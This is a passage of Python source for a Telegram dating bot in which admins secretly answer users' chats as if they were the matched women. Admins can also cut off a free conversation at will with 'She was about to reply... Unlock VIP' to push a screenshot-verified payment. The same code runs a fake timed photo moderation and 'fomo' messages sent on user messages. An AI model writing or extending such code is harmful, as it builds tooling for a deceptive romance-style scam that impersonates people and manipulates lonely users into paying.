        bot.send_message(user_id, "No matches yet. Keep exploring.", reply_markup=main_menu_keyboard(user_id))
        return

    current_match_id = user.get("current_match_id")
    if current_match_id in matches:
        cursor = matches.index(current_match_id)
    else:
        cursor = 0

    with state_lock:
        user["match_cursor"] = cursor
        save_state()
    send_match_card(user_id, matches[cursor])



def show_next_match(user_id):
    user = get_user(user_id)
    matches = get_visible_match_ids(user_id)
    if not matches:
        bot.send_message(user_id, "No matches yet. Keep exploring.", reply_markup=main_menu_keyboard(user_id))
        return

    current_cursor = int(user.get("match_cursor", 0))
    next_cursor = (current_cursor + 1) % len(matches)
    with state_lock:
        user["match_cursor"] = next_cursor
        save_state()
    send_match_card(user_id, matches[next_cursor])


def text_from_message(message):
    if message.content_type == "text":
        return message.text
    return "[non-text message]"


def forward_user_message_to_admins(message):
    user = get_user(message.chat.id)
    match_id = user["current_match_id"]
    if not match_id:
        return
    append_chat_message(message.chat.id, match_id, "user", text_from_message(message))
    increment_admin_unread(message.chat.id, match_id)
    maybe_send_fomo_message(message.chat.id, match_id)


def open_match_chat(user_id, match_id, show_history=True):
    state = get_chat_state(user_id, match_id)
    user = get_user(user_id)

    if state == "blocked":
        bot.send_message(user_id, "This chat is no longer available.", reply_markup=main_menu_keyboard(user_id))
        return

    if state == "ended":
        bot.send_message(user_id, "This chat has ended.", reply_markup=main_menu_keyboard(user_id))
        return

    if state == "locked" and not user["paid"]:
        history = get_recent_chat_history(user_id, match_id)
        if history:
            profile = get_profile(match_id)
            name = profile["name"] if profile else "your match"
            bot.send_message(user_id, format_chat_history(name, history), parse_mode="HTML")
        bot.send_message(
            user_id,
            "She was about to reply...\n\nUnlock VIP to continue chatting \U0001F513",
            reply_markup=likes_locked_keyboard(),
        )
        return

    if state == "available" and not can_activate_chat(user_id, match_id):
        reply_markup = buy_keyboard() if not user["paid"] else main_menu_keyboard(user_id)
        bot.send_message(user_id, chat_limit_message(user_id), reply_markup=reply_markup)
        return

    match_profile = get_profile(match_id)
    with state_lock:
        user = get_user(user_id)
        user["chat_open"] = True
        user["active_view"] = "chat"
        user["current_match_id"] = match_id
        paid = user["paid"]
        save_state()
    reset_unread(user_id, match_id)
    if not show_history:
        return
    name = match_profile["name"] if match_profile else "your match"
    if match_profile:
        bot.send_photo(
            user_id,
            match_profile["photo"],
            caption=f"{match_profile['name']}, {match_profile['age']}",
            reply_markup=match_keyboard(paid),
        )
    history = get_recent_chat_history(user_id, match_id)
    bot.send_message(user_id, format_chat_history(name, history), reply_markup=match_keyboard(paid), parse_mode="HTML")
    bot.send_message(
        user_id,
        "Type your message below.",
        reply_markup=match_keyboard(paid),
    )


@bot.message_handler(commands=["start"])
def start_handler(message):
    user = get_user(message.chat.id)
    if is_admin(message.chat.id):
        bot.send_message(message.chat.id, "Admin menu is ready.", reply_markup=admin_menu_keyboard())
        return
    with state_lock:
        user["chat_open"] = False
        user["active_view"] = "start"
        save_state()
    send_welcome_screen(message.chat.id)


@bot.message_handler(
    func=lambda message: message.chat.id in CHAT_ADMINS and bool(message.reply_to_message),
    content_types=["text"],
)
def admin_reply_handler(message):
    with state_lock:
        chat_context = chat_map.get(message.reply_to_message.message_id)
    if chat_context:
        user_id = chat_context["user_id"]
        match_id = chat_context["match_id"]
        state = get_chat_state(user_id, match_id)
        if state == "available":
            if not can_activate_chat(user_id, match_id):
                bot.send_message(message.chat.id, f"Cannot activate this chat.\n{chat_limit_message(user_id)}")
                return
            set_chat_state(user_id, match_id, "active")
        elif state != "active":
            bot.send_message(message.chat.id, "This chat is not active anymore.")
            return
        append_chat_message(user_id, match_id, "match", message.text)
        increment_unread(user_id, match_id)
        threading.Thread(
            target=send_typing_then_match_message,
            args=(user_id, match_id, message.text),
            daemon=True,
        ).start()


@bot.message_handler(func=lambda message: message.chat.id in CHAT_ADMINS and not bool(message.reply_to_message), content_types=["text"])
def admin_menu_handler(message):
    text = message.text.strip()
    if text in {BTN_ADMIN_CHATS, BTN_ADMIN_REFRESH}:
        send_admin_chat_list(message.chat.id)
        return
    if text == BTN_ADMIN_UNREAD:
        send_admin_chat_list(message.chat.id, unread_only=True)
        return
    bot.send_message(message.chat.id, "Use the admin buttons to open chats.", reply_markup=admin_menu_keyboard())


@bot.message_handler(content_types=["photo"])
def photo_handler(message):
    user_id = message.chat.id
    if is_on_cooldown(user_id):
        bot.send_message(user_id, "Please wait a moment ⏳")
        return
    user = get_user(user_id)
    file_id = message.photo[-1].file_id

    if user["step"] == "photo":
        with state_lock:
            user["photo"] = file_id
            user["step"] = "moderation"
            user["moderation_pending"] = True
            save_state()
        threading.Thread(target=delayed_moderation_success, args=(user_id,), daemon=True).start()
        return

    if user["chat_open"] and user["current_match_id"]:
        match_id = user["current_match_id"]
        state = get_chat_state(user_id, match_id)
        if state == "blocked":
            bot.send_message(user_id, "This chat is no longer available.", reply_markup=main_menu_keyboard(user_id))
            return
        if state == "ended":
            bot.send_message(user_id, "This chat has ended.", reply_markup=main_menu_keyboard(user_id))
            return
        if state == "locked" and not user["paid"]:
            bot.send_message(user_id, "She was about to reply...\n\nUnlock VIP to continue chatting.", reply_markup=likes_locked_keyboard())
            return
        if state in {"available", "locked"}:
            if not can_activate_chat(user_id, match_id):
                reply_markup = buy_keyboard() if not user["paid"] else main_menu_keyboard(user_id)
                bot.send_message(user_id, chat_limit_message(user_id), reply_markup=reply_markup)
                return
            set_chat_state(user_id, match_id, "active")
        append_chat_message(user_id, match_id, "user", "[Photo]")
        increment_admin_unread(user_id, match_id)
        maybe_send_fomo_message(user_id, match_id)
        return

    if user["awaiting_payment"]:
        for admin in PAYMENT_ADMINS:
            bot.send_photo(
                admin,
                file_id,
                caption=f"Payment screenshot\nUser ID: {user_id}",
                reply_markup=payment_markup(user_id),
            )
        with state_lock:
            user["awaiting_payment"] = False
            save_state()
        bot.send_message(user_id, "Payment screenshot received. Waiting for review.", reply_markup=main_menu_keyboard(user_id))
        return

    bot.send_message(user_id, "Please use the available buttons to continue.")




@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.data.startswith("chatctl_"):
        parts = call.data.split("_")
        if len(parts) == 4 and parts[2].isdigit() and parts[3].isdigit():
            action = parts[1]
            user_id = int(parts[2])
            match_id = int(parts[3])
            user = get_user(user_id)
            state = get_chat_state(user_id, match_id)

            if action == "lock":
                if user["paid"]:
                    bot.answer_callback_query(call.id, "VIP chat cannot be locked")
                    return
                if state != "active":
                    bot.answer_callback_query(call.id, "Chat is not active")
                    return
                set_chat_state(user_id, match_id, "locked")
                append_system_message(user_id, match_id, "She was about to reply… Unlock VIP to continue chatting 🔓")
                bot.send_message(user_id, "She was about to reply…\n\nUnlock VIP to continue chatting 🔓", reply_markup=likes_locked_keyboard())
                bot.answer_callback_query(call.id, "Chat locked")
                return

            if action == "end":
                if state in {"ended", "blocked"}:
                    bot.answer_callback_query(call.id, "Chat already closed")
                    return
                set_chat_state(user_id, match_id, "ended")
                append_system_message(user_id, match_id, "This conversation has ended.")
                remove_match_from_inbox(user_id, match_id)
                bot.send_message(
                    user_id,
                    "This conversation has ended.\n\nYou can start a new chat anytime.",
                    reply_markup=main_menu_keyboard(user_id),
                )
                bot.answer_callback_query(call.id, "Chat ended")
                return

            if action == "block":
                if state == "blocked":
                    bot.answer_callback_query(call.id, "Chat already blocked")
                    return
                set_chat_state(user_id, match_id, "blocked")
                append_system_message(user_id, match_id, "This chat is no longer available.")
                remove_match_from_inbox(user_id, match_id)
                bot.send_message(user_id, "This chat is no longer available.", reply_markup=main_menu_keyboard(user_id))
                bot.answer_callback_query(call.id, "Chat blocked")
                return

        bot.answer_callback_query(call.id, "Invalid action")
        return

    if call.data.startswith("userchat_"):
        match_id_text = call.data.split("_", 1)[1]
        if match_id_text.isdigit():
            user_id = call.message.chat.id
            match_id = int(match_id_text)
            user = get_user(user_id)
            if match_id not in user["matches"]:
                bot.answer_callback_query(call.id, "Match not found")
                return
            with state_lock:
                user["current_match_id"] = match_id
                save_state()
            open_match_chat(user_id, match_id, show_history=True)
            bot.answer_callback_query(call.id, "Chat opened")
            return
        bot.answer_callback_query(call.id, "Invalid chat")
        return

    if call.data == "adminrefresh":
        send_admin_chat_list(call.message.chat.id)
        bot.answer_callback_query(call.id, "Refreshed")
        return

    if call.data == "adminunread":
        send_admin_chat_list(call.message.chat.id, unread_only=True)
        bot.answer_callback_query(call.id, "Showing unread chats")
        return

    if call.data.startswith("adminchat_"):
        parts = call.data.split("_")
        if len(parts) == 3 and parts[1].isdigit() and parts[2].isdigit():
            user_id = int(parts[1])
            match_id = int(parts[2])
            send_admin_chat_history(call.message.chat.id, user_id, match_id)
            bot.answer_callback_query(call.id, "Chat opened")
            return
        bot.answer_callback_query(call.id, "Invalid chat")
        return

    action, _, raw_user_id = call.data.partition("_")
    if not raw_user_id.isdigit():
        bot.answer_callback_query(call.id, "Invalid action")
        return

    user_id = int(raw_user_id)
    user = get_user(user_id)

    if action == "approve":
        with state_lock:
            user["paid"] = True
            for thread in user.get("chat_threads", {}).values():
                if thread.get("state") == "locked":
                    thread["state"] = "available"
            save_state()
        bot.send_message(
            user_id,
            "VIP activated successfully.\nYou can now view likes and reply to your matches.",
            reply_markup=main_menu_keyboard(user_id),
        )
        bot.answer_callback_query(call.id, "Approved")
        return

    if action == "reject":
        bot.send_message(user_id, "Payment wasn't approved. Please send a clear screenshot again.", reply_markup=buy_keyboard())
        bot.answer_callback_query(call.id, "Rejected")
        return

    bot.answer_callback_query(call.id, "Unknown action")


@bot.message_handler(func=lambda message: message.chat.id not in CHAT_ADMINS, content_types=["text"])
def text_handler(message):
    user_id = message.chat.id
    text = message.text.strip()
    user = get_user(user_id)

    if text == BTN_START_OVER:
        reset_user(user_id)
        bot.send_message(
            user_id,
            "Your test profile has been reset.\nLet's start again.",
            reply_markup=welcome_keyboard(),
        )
        return

    if text == BTN_CONTINUE:
        if user["step"] == "start":
            bot.send_message(user_id, "🔞 Are you 18 or older?\n\nYou must be 18+ to continue.", reply_markup=age_keyboard())
        else:
            send_current_step_prompt(user_id)
        return

    if user["step"] == "start":
        if text == BTN_18_YES:
            with state_lock:
                user["step"] = "gender"
                save_state()
            bot.send_message(user_id, "Tell us your gender.", reply_markup=gender_keyboard())
        else:
            bot.send_message(user_id, "Tap Continue to begin.", reply_markup=welcome_keyboard())
        return

    if user["step"] == "gender":
        if text not in {BTN_GENDER_MALE, BTN_GENDER_FEMALE}:
            bot.send_message(user_id, "Choose one of the gender buttons.", reply_markup=gender_keyboard())
            return
        with state_lock:
            user["gender"] = text
            user["step"] = "city"
            save_state()
        bot.send_message(user_id, "Enter your city.", reply_markup=ReplyKeyboardRemove())
        return

    if user["step"] == "city":
        with state_lock:
            user["city"] = text
            user["name"] = message.from_user.first_name or "User"
            user["step"] = "photo"
            save_state()
        bot.send_message(user_id, "Send your best photo.")
        return

    if user["step"] == "photo":
        bot.send_message(user_id, "Please send a photo to continue.")
        return

    if user["step"] == "moderation":
        bot.send_message(user_id, "Your photo is still being reviewed. Please wait a moment.")
        return

    if user["step"] == "agreement":
        if text == BTN_READ_AGREEMENT:
            send_agreement_details(user_id)
            return
        if text == BTN_AGREE_CONTINUE:
            with state_lock:
                user["agreed"] = True
                user["step"] = "ready"
                save_state()
            send_main_menu(user_id)
            return
        send_agreement(user_id)
        return

    if text.lower() in {"/profiles", BTN_START.lower()}:
        send_profile_card(user_id)
        return

    if text == BTN_VIEW_PROFILE:
        profile_id = user["current_profile_id"]
        if profile_id is None:
            send_profile_card(user_id, detailed=True)
        else:
            send_profile_card(user_id, detailed=True, profile_id=profile_id)
        return

    if text in {"/likes_you", BTN_LIKES, BTN_SEE_LIKES}:
        open_likes_you(user_id)
        return

    if text == BTN_MATCHES or text.startswith("💖 Matches"):
        show_matches(user_id)
        return

    if text == BTN_NEXT_MATCH:
        show_next_match(user_id)
        return

    if text in {"/settings", BTN_SETTINGS}:
        bot.send_message(user_id, "Choose a section.", reply_markup=settings_keyboard())
        return

    print(f"DEBUG VIP: text='{text}' | BTN_BUY='{BTN_BUY}' | BTN_VIP='{BTN_VIP}' | Checking for match...")
    if text in {"/buy", BTN_BUY, BTN_GET_VIP, BTN_VIP} or text == "🔒 VIP":
        print(f"DEBUG: VIP button TRIGGERED for user_id={user_id}")
        bot.send_message(user_id, unlock_text(), reply_markup=buy_keyboard())
        return

    if text == BTN_SEND_PAYMENT:
        if is_on_cooldown(user_id):
            bot.send_message(user_id, "Please wait a moment ⏳")
            return
        with state_lock:
            user["awaiting_payment"] = True
            save_state()
        bot.send_message(user_id, "Send the payment screenshot now.")
        return

    if text == BTN_MY_PROFILE:
        caption = (
            f"Profile summary\n\n"
            f"Name: {user['name']}\n"
            f"Gender: {user['gender']}\n"
            f"City: {user['city']}\n"
            f"VIP: {'Yes' if user['paid'] else 'No'}"
        )
        if user["photo"]:
            bot.send_photo(user_id, user["photo"], caption=caption, reply_markup=settings_keyboard())
        else:
            bot.send_message(user_id, caption, reply_markup=settings_keyboard())
        return

    if text == BTN_SEARCH_SETTINGS:
        bot.send_message(
            user_id,
            "Search settings can be expanded later.\nRight now matching stays broad and natural.",
            reply_markup=settings_keyboard(),
        )
        return

    if text == BTN_BOOST:
        bot.send_message(user_id, "Boost can be connected to coins later.", reply_markup=settings_keyboard())
        return

    if text == BTN_MAIN_MENU:
        send_main_menu(user_id)
        return

    if text == BTN_SEND_GIFT:
        bot.send_message(user_id, "Gifts can be enabled later with coins or VIP.", reply_markup=buy_keyboard())
        return

    if text == BTN_CHAT:
        if not user["current_match_id"]:
            bot.send_message(user_id, "Open one of your matches first.", reply_markup=main_menu_keyboard(user_id))
            return
        match_id = user["current_match_id"]
        open_match_chat(user_id, match_id, show_history=True)
        return

    if text == BTN_END_CHAT:
        if not user["paid"]:
            bot.send_message(user_id, "This option is available after VIP unlock.", reply_markup=main_menu_keyboard(user_id))
            return
        if not user["current_match_id"]:
            bot.send_message(user_id, "Open a chat first.", reply_markup=main_menu_keyboard(user_id))
            return
        match_id = user["current_match_id"]
        state = get_chat_state(user_id, match_id)
        if state != "active":
            bot.send_message(user_id, "This chat is already closed.", reply_markup=main_menu_keyboard(user_id))
            return
        set_chat_state(user_id, match_id, "ended")
        append_system_message(user_id, match_id, "This conversation has ended.")
        notify_admin_chat_status(user_id, match_id, "User ended chat")
        remove_match_from_inbox(user_id, match_id)
        bot.send_message(
            user_id,
            "This conversation has ended.\n\nYou can start a new chat anytime.",
            reply_markup=main_menu_keyboard(user_id),
        )
        return

    if text == BTN_LIKE:
        if is_on_cooldown(user_id):
            bot.send_message(user_id, "Please wait a moment ⏳")
            return
        profile_id = user["current_profile_id"]
        if profile_id is None:
            send_profile_card(user_id)
            return

        profile = get_profile(profile_id)
        with state_lock:
            if profile_id in user["liked"] or profile_id in user["matches"]:
                already_liked = True
                save_state()
            else:
                already_liked = False
                user["liked"].append(profile_id)
            user["swipes"] += 1
            was_incoming = profile_id in user["incoming_likes"]
            if profile_id in user["incoming_likes"]:
                user["incoming_likes"].remove(profile_id)
            if not was_incoming and not already_liked:
                schedule_reaction_after_like(user, profile_id)
            save_state()

        if already_liked:
            bot.send_message(
                user_id,
                "You already reacted to this profile. Let's keep moving.",
                reply_markup=build_keyboard([BTN_MAIN_MENU]),
            )
            process_pending_events(user_id)
            time.sleep(random.uniform(0.4, 0.8))
            send_profile_card(user_id)
            return

        if profile:
            send_like_feedback(user_id, profile)

        if was_incoming and profile_id not in user["matches"]:
            threading.Thread(target=create_match, args=(user_id, profile_id, "liked_back"), daemon=True).start()

        process_pending_events(user_id)
        time.sleep(random.uniform(0.6, 1.1))
        send_profile_card(user_id)
        return

    if text == BTN_SKIP:
        if is_on_cooldown(user_id):
            bot.send_message(user_id, "Please wait a moment ⏳")
            return
        with state_lock:
            profile_id = user["current_profile_id"]
            if profile_id and profile_id not in user["skipped"]:
                user["skipped"].append(profile_id)
            if profile_id in user["incoming_likes"]:
                user["incoming_likes"].remove(profile_id)
            user["swipes"] += 1
            save_state()
        process_pending_events(user_id)
        send_profile_card(user_id)
        return

    if user["current_match_id"] and user.get("active_view") in {"match", "chat"}:
        match_id = user["current_match_id"]
        state = get_chat_state(user_id, match_id)
        if state == "blocked":
            bot.send_message(user_id, "This chat is no longer available.", reply_markup=main_menu_keyboard(user_id))
            return
        if state == "ended":
            bot.send_message(user_id, "This chat has ended.", reply_markup=main_menu_keyboard(user_id))
            return
        if state == "available":
            if not can_activate_chat(user_id, match_id):
                reply_markup = buy_keyboard() if not user["paid"] else main_menu_keyboard(user_id)
                bot.send_message(
                    user_id,
                    chat_limit_message(user_id),
                    reply_markup=reply_markup,
                )
                return
            set_chat_state(user_id, match_id, "active")
            if not user["chat_open"]:
                open_match_chat(user_id, match_id, show_history=False)
        elif state == "locked" and not user["paid"]:
            bot.send_message(user_id, "She was about to reply...\n\nUnlock VIP to continue chatting.", reply_markup=likes_locked_keyboard())
            return
        elif state == "locked" and user["paid"]:
            if not can_activate_chat(user_id, match_id):
                bot.send_message(
                    user_id,
                    chat_limit_message(user_id),
                    reply_markup=main_menu_keyboard(user_id),
                )
                return
            set_chat_state(user_id, match_id, "active")
            if not user["chat_open"]:
                open_match_chat(user_id, match_id, show_history=False)
        elif not user["chat_open"]:
            open_match_chat(user_id, match_id, show_history=False)
        if is_on_cooldown(user_id):
            bot.send_message(user_id, "Please wait a moment ⏳")
            return
        print(f"DEBUG: Forwarding message to admins - text='{text}'")
        forward_user_message_to_admins(message)
        return

    send_main_menu(user_id)


print("Running...")
bot.infinity_polling(skip_pending=True, timeout=30, long_polling_timeout=30)
